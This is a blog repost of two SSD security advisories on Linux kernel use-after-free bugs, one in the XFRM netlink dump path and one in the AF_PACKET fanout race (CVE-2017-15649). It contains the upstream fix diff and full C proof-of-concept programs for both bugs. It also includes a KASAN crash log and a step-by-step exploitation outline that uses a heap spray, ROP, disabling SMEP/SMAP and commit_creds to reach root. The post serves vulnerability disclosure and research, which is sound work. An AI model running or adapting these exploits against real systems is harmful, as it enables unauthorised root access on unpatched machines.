---
layout: post
title: SSD Advisory – 两枚Linux内核漏洞
subtitle: Linux内核XFRM提权漏洞 & Linux内核AF_PACKET 释放后重用漏洞
date: 2017-11-27
author: FR
header-img: img/depot/post-butiao.jpg
catalog: true
tags:
    - linux
    - vulnerability
    - LPE
    - PoC
---

- **来自SecuriTeam Blogs [【SecuriTeam Blogs链接】](https://blogs.securiteam.com/)**  

# SSD Advisory – Linux Kernel XFRM Privilege Escalation
**Want to get paid for a vulnerability similar to this one?**  
Contact us at: ssd@beyondsecurity.com  
See our full scope at: https://blogs.securiteam.com/index.php/product_scope

## Vulnerability Summary
The following advisory describes a Use-after-free vulnerability found in Linux kernel that can lead to privilege escalation. The vulnerability found in Netlink socket subsystem – XFRM.

Netlink is used to transfer information between the kernel and user-space processes. It consists of a standard sockets-based interface for user space processes and an internal kernel API for kernel modules.

## Credit
An independent security researcher, Mohamed Ghannam, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program

## Vendor response
The vulnerability has been addressed as part of 1137b5e (“ipsec: Fix aborted xfrm policy dump crash”) patch:
```
 @@ -1693,32 +1693,34 @@ static int dump_one_policy(struct xfrm_policy *xp, int dir, int count, void *ptr

 static int xfrm_dump_policy_done(struct netlink_callback *cb)
 {
-	struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *) &cb->args[1];
+	struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;
 	struct net *net = sock_net(cb->skb->sk);
 
 	xfrm_policy_walk_done(walk, net);
 	return 0;
 }
 
+static int xfrm_dump_policy_start(struct netlink_callback *cb)
+{
+	struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;
+
+	BUILD_BUG_ON(sizeof(*walk) > sizeof(cb->args));
+
+	xfrm_policy_walk_init(walk, XFRM_POLICY_TYPE_ANY);
+	return 0;
+}
+
 static int xfrm_dump_policy(struct sk_buff *skb, struct netlink_callback *cb)
 {
 	struct net *net = sock_net(skb->sk);
-	struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *) &cb->args[1];
+	struct xfrm_policy_walk *walk = (struct xfrm_policy_walk *)cb->args;
 	struct xfrm_dump_info info;
 
-	BUILD_BUG_ON(sizeof(struct xfrm_policy_walk) >
-		     sizeof(cb->args) - sizeof(cb->args[0]));
-
 	info.in_skb = cb->skb;
 	info.out_skb = skb;
 	info.nlmsg_seq = cb->nlh->nlmsg_seq;
 	info.nlmsg_flags = NLM_F_MULTI;
 
-	if (!cb->args[0]) {
-		cb->args[0] = 1;
-		xfrm_policy_walk_init(walk, XFRM_POLICY_TYPE_ANY);
-	}
-
 	(void) xfrm_policy_walk(net, walk, dump_one_policy, &info);
 
 	return skb->len;
 @@ -2474,6 +2476,7 @@ static const struct nla_policy xfrma_spd_policy[XFRMA_SPD_MAX+1] = {
 
 static const struct xfrm_link {
 	int (*doit)(struct sk_buff *, struct nlmsghdr *, struct nlattr **);
+	int (*start)(struct netlink_callback *);
 	int (*dump)(struct sk_buff *, struct netlink_callback *);
 	int (*done)(struct netlink_callback *);
 	const struct nla_policy *nla_pol;
 @@ -2487,6 +2490,7 @@ static const struct xfrm_link {
 	[XFRM_MSG_NEWPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_add_policy    },
 	[XFRM_MSG_DELPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy    },
 	[XFRM_MSG_GETPOLICY   - XFRM_MSG_BASE] = { .doit = xfrm_get_policy,
+						   .start = xfrm_dump_policy_start,
 						   .dump = xfrm_dump_policy,
 						   .done = xfrm_dump_policy_done },
 	[XFRM_MSG_ALLOCSPI    - XFRM_MSG_BASE] = { .doit = xfrm_alloc_userspi },
 @@ -2539,6 +2543,7 @@ static int xfrm_user_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh,
 
 		{
 			struct netlink_dump_control c = {
+				.start = link->start,
 				.dump = link->dump,
 				.done = link->done,
 			};
```

## Vulnerability details
An unprivileged user can change Netlink socket subsystem – XFRM value sk->sk_rcvbuf (sk == struct sock object).

The value can be changed into specific range via setsockopt(SO_RCVBUF). sk_rcvbuf is the total number of bytes of a buffer receiving data via recvmsg/recv/read.

The sk_rcvbuf value is how many bytes the kernel should allocate for the skb (struct sk_buff objects).

skb->trusize is a variable which keep track of how many bytes of memory are consumed, in order to not wasting and manage memory, the kernel can handle the skb size at run time.

For example, if we allocate a large socket buffer (skb) and we only received 1-byte packet size, the kernel will adjust this by calling skb_set_owner_r.

By calling skb_set_owner_r the sk->sk_rmem_alloc (refers to an atomic variable sk->sk_backlog.rmem_alloc) is modified.

![img/2017-11-27/Linux1-300x30.jpg](https://blogs.securiteam.com/wp-content/uploads/2017/11/Linux1-300x30.jpg)

When we create a XFRM netlink socket, xfrm_dump_policy is called, when we close the socket xfrm_dump_policy_done is called.

xfrm_dump_policy_done is called whenever cb_running for netlink_sock object is true.

The xfrm_dump_policy_done tries to clean-up a xfrm walk entry which is managed by netlink_callback object.

![img/2017-11-27/Linux2-300x66.jpg](https://blogs.securiteam.com/wp-content/uploads/2017/11/Linux2-300x66.jpg)

When netlink_skb_set_owner_r is called (like skb_set_owner_r) it updates the sk_rmem_alloc.

netlink_dump():
![img/2017-11-27/Linux3-300x25.jpg](https://blogs.securiteam.com/wp-content/uploads/2017/11/Linux3-300x25.jpg)

In above snippet we can see that netlink_dump() check fails when sk->sk_rcvbuf is smaller than sk_rmem_alloc (notice that we can control sk->sk_rcvbuf via stockpot).

When this condition fails, it jumps to the end of a function and quit with failure and the value of cb_running doesn’t changed to false.

![img/2017-11-27/Linux4-300x124.jpg](https://blogs.securiteam.com/wp-content/uploads/2017/11/Linux4-300x124.jpg)

nlk->cb_running is true, thus xfrm_dump_policy_done() is being called.

nlk->cb.done points to xfrm_dump_policy_done, it worth noting that this function handles a doubly linked list, so if we can tweak this vulnerability to reference a controlled buffer, we could have a read/write what/where primitive.

## Proof of Concept
The following proof of concept is for Ubuntu 17.04.
```
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <sched.h>
#include <unistd.h>

#define BUFSIZE 2048


int fd;
struct sockaddr_nl addr;

struct msg_policy {
    struct nlmsghdr msg;
    char buf[BUFSIZE];
};

void create_nl_socket(void)
{
    fd = socket(PF_NETLINK,SOCK_RAW,NETLINK_XFRM);
    memset(&addr,0,sizeof(struct sockaddr_nl));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = 0; /* packet goes into the kernel */
    addr.nl_groups = XFRMNLGRP_NONE; /* no need for multicast group */

}

void do_setsockopt(void)
{
    int var =0x100;

    setsockopt(fd,1,SO_RCVBUF,&var,sizeof(int));
}

struct msg_policy *init_policy_dump(int size)
{
    struct msg_policy *r;

    r = malloc(sizeof(struct msg_policy));
    if(r == NULL) {
        perror("malloc");
        exit(-1);
    }
    memset(r,0,sizeof(struct msg_policy));

    r->msg.nlmsg_len = 0x10;
    r->msg.nlmsg_type = XFRM_MSG_GETPOLICY;
    r->msg.nlmsg_flags = NLM_F_MATCH | NLM_F_MULTI |  NLM_F_REQUEST;
    r->msg.nlmsg_seq = 0x1;
    r->msg.nlmsg_pid = 2;
    return r;

}
int send_msg(int fd,struct nlmsghdr *msg)
{
    int err;
    err = sendto(fd,(void *)msg,msg->nlmsg_len,0,(struct sockaddr*)&addr,sizeof(struct sockaddr_nl));
    if (err < 0) {
        perror("sendto");
        return -1;
    }
    return 0;

}

void create_ns(void)
{
	if(unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(1);
	}
	if(unshare(CLONE_NEWNET) != 0) {
		perror("unshared(CLONE_NEWUSER)");
		exit(2);
	}
}
int main(int argc,char **argv)
{
    struct msg_policy *p;
    create_ns();

    create_nl_socket();
    p = init_policy_dump(100);
    do_setsockopt();
    send_msg(fd,&p->msg);
    p = init_policy_dump(1000);
    send_msg(fd,&p->msg);
    return 0;
}
```

# SSD安全公告–Linux内核AF_PACKET 释放后重用漏洞
**Want to get paid for a vulnerability similar to this one?**  
Contact us at: ssd@beyondsecurity.com  
See our full scope at: https://blogs.securiteam.com/index.php/product_scope

## 漏洞概要
以下安全公告描述了在Linux内核的AF_PACKET中存在的一个UAF漏洞，成功利用该漏洞可能导致权限提升。

AF_PACKET套接字”允许用户在设备驱动层发送或者接收数据包”。例如，用户可以在物理层之上实现自己的协议，或者嗅探包含以太网或更高层协议头的数据包。

## 漏洞提交者
一名独立的安全研究人员发现并向 Beyond Security 的 SSD 报告了该漏洞。

## 厂商响应
更新一

CVE:CVE-2017-15649

“该漏洞很可能已经通过以下方式修复了：

packet: 重新绑定fanout hook时保持绑定锁定 – http://patchwork.ozlabs.org/patch/813945/

与此相关，但未合并的是

packet:在packet_do_bind函数中，使用bind_lock测试fanout – http://patchwork.ozlabs.org/patch/818726/

我们验证了在v4.14-rc2上不会触发该漏洞，但在第一次commit(008ba2a13f2d)上测试成功。”

## 漏洞详细信息
该UAF漏洞是由于fanout_add(来自setsockopt)和AF_PACKET套接字之间竞争条件导致的。

即使已经从fanout_add()创建了一个packet_fanout，竞争也会导致来自packet_do_bind()的__unregister_prot_hook()将po-> running设置为0。

这允许我们绕过packet_release()中的unregister_prot_hook()的检查，从而导致即使packet_fanout已经被释放，但是仍然可以从packet_type链接列表引用。

## 漏洞证明
```
// Please note, to have KASAN report the UAF, you need to enable it when compiling the kernel.
// the kernel config is provided too.

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <fcntl.h>

#define IS_ERR(c, s) { if (c) perror(s); }

struct sockaddr_ll {
	unsigned short	sll_family;
	short		sll_protocol; // big endian
	int		sll_ifindex;
	unsigned short	sll_hatype;
	unsigned char	sll_pkttype;
	unsigned char	sll_halen;
	unsigned char	sll_addr[8];
};

static int fd;
static struct ifreq ifr;
static struct sockaddr_ll addr;

void *task1(void *unused)
{	
	int fanout_val = 0x3;

	// need race: check on po->running
	// also must be 1st or link wont register
	int err = setsockopt(fd, 0x107, 18, &fanout_val, sizeof(fanout_val));
	// IS_ERR(err == -1, "setsockopt");	
}

void *task2(void *unused)
{
	int err = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
	// IS_ERR(err == -1, "bind");
}

void loop_race()
{
	int err, index;

	while(1) {
		fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
		IS_ERR(fd == -1, "socket");

		strcpy((char *)&ifr.ifr_name, "lo");
		err = ioctl(fd, SIOCGIFINDEX, &ifr);
		IS_ERR(err == -1, "ioctl SIOCGIFINDEX");
		index = ifr.ifr_ifindex;

		err = ioctl(fd, SIOCGIFFLAGS, &ifr);
		IS_ERR(err == -1, "ioctl SIOCGIFFLAGS");

		ifr.ifr_flags &= ~(short)IFF_UP;
		err = ioctl(fd, SIOCSIFFLAGS, &ifr);
		IS_ERR(err == -1, "ioctl SIOCSIFFLAGS");

		addr.sll_family = AF_PACKET;
		addr.sll_protocol = 0x0; // need something different to rehook && 0 to skip register_prot_hook
		addr.sll_ifindex = index;

		pthread_t thread1, thread2;
	    pthread_create (&thread1, NULL, task1, NULL);
	    pthread_create (&thread2, NULL, task2, NULL);

	    pthread_join(thread1, NULL);
	    pthread_join(thread2, NULL);

		// UAF
		close(fd); 
	}
}

static bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER) != 0) {
		printf("[!] unprivileged user namespaces are not available\n");
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}
}

int main(int argc, char *argv[]) 
{
	setup_sandbox();
	system("id; capsh --print");
	loop_race();	
	return 0;
}
```

## 崩溃日志
```
[   73.703931] dev_remove_pack: ffff880067cee280 not found
[   73.717350] ==================================================================
[   73.726151] BUG: KASAN: use-after-free in dev_add_pack+0x1b1/0x1f0
[   73.729371] Write of size 8 at addr ffff880067d28870 by task poc/1175
[   73.732594] 
[   73.733605] CPU: 3 PID: 1175 Comm: poc Not tainted 4.14.0-rc1+ #29
[   73.737714] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.1-1ubuntu1 04/01/2014
[   73.746433] Call Trace:
[   73.747985]  dump_stack+0x6c/0x9c
[   73.749410]  ? dev_add_pack+0x1b1/0x1f0
[   73.751622]  print_address_description+0x73/0x290
[   73.753646]  ? dev_add_pack+0x1b1/0x1f0
[   73.757343]  kasan_report+0x22b/0x340
[   73.758839]  __asan_report_store8_noabort+0x17/0x20
[   73.760617]  dev_add_pack+0x1b1/0x1f0
[   73.761994]  register_prot_hook.part.52+0x90/0xa0
[   73.763675]  packet_create+0x5e3/0x8c0
[   73.765072]  __sock_create+0x1d0/0x440
[   73.766030]  SyS_socket+0xef/0x1b0
[   73.766891]  ? move_addr_to_kernel+0x60/0x60
[   73.769137]  ? exit_to_usermode_loop+0x118/0x150
[   73.771668]  entry_SYSCALL_64_fastpath+0x13/0x94
[   73.773754] RIP: 0033:0x44d8a7
[   73.775130] RSP: 002b:00007ffc4e642818 EFLAGS: 00000217 ORIG_RAX: 0000000000000029
[   73.780503] RAX: ffffffffffffffda RBX: 00000000004002f8 RCX: 000000000044d8a7
[   73.785654] RDX: 0000000000000011 RSI: 0000000000000003 RDI: 0000000000000011
[   73.790358] RBP: 00007ffc4e642840 R08: 00000000000000ca R09: 00007f4192e6e9d0
[   73.793544] R10: 0000000000000000 R11: 0000000000000217 R12: 000000000040b410
[   73.795999] R13: 000000000040b4a0 R14: 0000000000000000 R15: 0000000000000000
[   73.798567] 
[   73.799095] Allocated by task 1360:
[   73.800300]  save_stack_trace+0x16/0x20
[   73.802533]  save_stack+0x46/0xd0
[   73.803959]  kasan_kmalloc+0xad/0xe0
[   73.805833]  kmem_cache_alloc_trace+0xd7/0x190
[   73.808233]  packet_setsockopt+0x1d29/0x25c0
[   73.810226]  SyS_setsockopt+0x158/0x240
[   73.811957]  entry_SYSCALL_64_fastpath+0x13/0x94
[   73.814636] 
[   73.815367] Freed by task 1175:
[   73.816935]  save_stack_trace+0x16/0x20
[   73.821621]  save_stack+0x46/0xd0
[   73.825576]  kasan_slab_free+0x72/0xc0
[   73.827477]  kfree+0x91/0x190
[   73.828523]  packet_release+0x700/0xbd0
[   73.830162]  sock_release+0x8d/0x1d0
[   73.831612]  sock_close+0x16/0x20
[   73.832906]  __fput+0x276/0x6d0
[   73.834730]  ____fput+0x15/0x20
[   73.835998]  task_work_run+0x121/0x190
[   73.837564]  exit_to_usermode_loop+0x131/0x150
[   73.838709]  syscall_return_slowpath+0x15c/0x1a0
[   73.840403]  entry_SYSCALL_64_fastpath+0x92/0x94
[   73.842343] 
[   73.842765] The buggy address belongs to the object at ffff880067d28000
[   73.842765]  which belongs to the cache kmalloc-4096 of size 4096
[   73.845897] The buggy address is located 2160 bytes inside of
[   73.845897]  4096-byte region [ffff880067d28000, ffff880067d29000)
[   73.851443] The buggy address belongs to the page:
[   73.852989] page:ffffea00019f4a00 count:1 mapcount:0 mapping:          (null) index:0x0 compound_mapcount: 0
[   73.861329] flags: 0x100000000008100(slab|head)
[   73.862992] raw: 0100000000008100 0000000000000000 0000000000000000 0000000180070007
[   73.866052] raw: dead000000000100 dead000000000200 ffff88006cc02f00 0000000000000000
[   73.870617] page dumped because: kasan: bad access detected
[   73.872456] 
[   73.872851] Memory state around the buggy address:
[   73.874057]  ffff880067d28700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   73.876931]  ffff880067d28780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   73.878913] >ffff880067d28800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   73.880658]                                                              ^
[   73.884772]  ffff880067d28880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   73.890978]  ffff880067d28900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   73.897763] ==================================================================
```

我们知道已经被释放的是一个kmalloc-4096对象：

```
struct packet_fanout {
	possible_net_t		net;
	unsigned int		num_members;
	u16			id;
	u8			type;
	u8			flags;
	union {
		atomic_t		rr_cur;
		struct bpf_prog __rcu	*bpf_prog;
	};
	struct list_head	list;
	struct sock		*arr[PACKET_FANOUT_MAX];
	spinlock_t		lock;
	refcount_t		sk_ref;
	struct packet_type	prot_hook ____cacheline_aligned_in_smp;
};
```

当通过af_packet.c中的register_prot_hook()的dev_add_pack()进行注册时，它的prot_hook成员在packet handler中被引用：

```
struct packet_type {
	__be16			type;	/* This is really htons(ether_type). */
	struct net_device	*dev;	/* NULL is wildcarded here	     */
	int			(*func) (struct sk_buff *,
					 struct net_device *,
					 struct packet_type *,
					 struct net_device *);
	bool			(*id_match)(struct packet_type *ptype,
					    struct sock *sk);
	void			*af_packet_priv;
	struct list_head	list;
};
```

结构体packet_type内部的函数指针，保存在一个大的slab分配器（kmalloc-4096）中，这使得堆喷射变更容易和更可靠，因为内核较少使用较大slab分配器。

我们可以使用常规的内核堆喷射来替换被释放的packet_fanout对象的内容，例如用sendmmsg()或其它函数。

即使分配的内存空间不是永久的，但仍然可以替换packet_fanout中的目标内容（例如函数指针），并且由于kmalloc-4096非常稳定，所以我们的payload几乎不可能被其它分配破坏。

当使用dev_queue_xmit()发送一个skb时会调用id_match()，通过AF_PACKET套接字上的sendmsg可以到达该路径。如果dev_queue_xmit参数非NULL，它通过调用id_match()的包处理程序列表进行循环。因此，可以通过下述方式进行漏洞利用。

一旦知道了内核的代码段，我们就可以把内核栈转换成我们伪造的packet_fanout对象和ROP。第一个参数ptype包含我们伪造对象的prot_hook成员的地址，这使得我们知道在哪里跳转。

一旦进入ROP，我们可以跳转到native_write_c4(x)去关闭SMEP/SMAP，然后跳回到用户空间执行我们真正的payload，通过调用commit_creds(prepare_kernel_cred(0))，将我们权限提升至root 。
